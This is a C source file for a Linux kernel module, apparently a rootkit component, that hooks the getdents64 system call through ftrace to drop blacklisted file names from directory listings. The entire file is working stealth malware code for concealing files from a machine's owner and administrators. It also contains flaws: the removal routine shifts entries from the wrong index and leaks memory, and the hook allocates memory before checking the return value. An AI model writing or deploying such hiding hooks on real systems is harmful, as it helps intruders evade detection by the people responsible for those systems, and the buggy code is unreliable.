#include "HiddenFile.h"

#define MAX_SIZE 32

typedef struct BlackList {
    char *nameList[MAX_SIZE];
    int size;
} BlackList;

static BlackList blackList;

static void initBlackList(BlackList *blackList) {
    memset(blackList->nameList, 0, sizeof(blackList->nameList));
    blackList->size = 0;
}

static void finiBlackList(BlackList *blackList) {
    int i;
    for (i = 0; i < blackList->size; i++) {
        kfree(blackList->nameList[i]);
    }
}

static bool contains(char *target) {
    int size, i;
    size = blackList.size;
    for (i = 0; i < size; i++) {
        if (!strcmp(blackList.nameList[i], target))
            return true;
    }
    return false;
}

void addHiddenFileName(char *name) {
    if (blackList.size >= MAX_SIZE)
        return;
    blackList.nameList[blackList.size++] = kstrdup(name, GFP_KERNEL);
}

void removeHiddenFileName(char *name) {
    int size, i, j;
    size = blackList.size;
    i = 0;
    while (i < size) {
        if (!strcmp(blackList.nameList[i], name)) {
            for (j = 0; j < size - 1; j++) {
                blackList.nameList[j] = blackList.nameList[j + 1];
            }
            size -= 1;
        } else {
            i += 1;
        }
    }
    blackList.size = size;
}

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);

struct linux_dirent64 {
    int64_t        d_ino;    /* 64-bit inode number */
    int64_t        d_off;    /* 64-bit offset to next structure */
    unsigned short d_reclen; /* Size of this dirent */
    unsigned char  d_type;   /* File type */
    char           d_name[]; /* Filename (null-terminated) */
};

asmlinkage int hook_getdents64(const struct pt_regs *regs) {
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;

    long error;
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    int ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    while (offset < ret) {
        current_dir = (void *)dirent_ker + offset;

        if (contains(current_dir->d_name)) {
            /* If PREFIX is contained in the first struct in the list, then we have to shift everything else up by it's size */
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else {
            previous_dir = current_dir;
        }
        offset += current_dir->d_reclen;
    }

    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
    /* Clean up and return whatever is left of the directory listing to the user */
    kfree(dirent_ker);
    return ret;

}

static struct ftrace_hook hooks[] = {
    HOOK("sys_getdents64", hook_getdents64, &orig_getdents64),
};

void initHiddenFile(void) {
    initBlackList(&blackList);
    fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

void finiHiddenFile(void) {
    finiBlackList(&blackList);
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}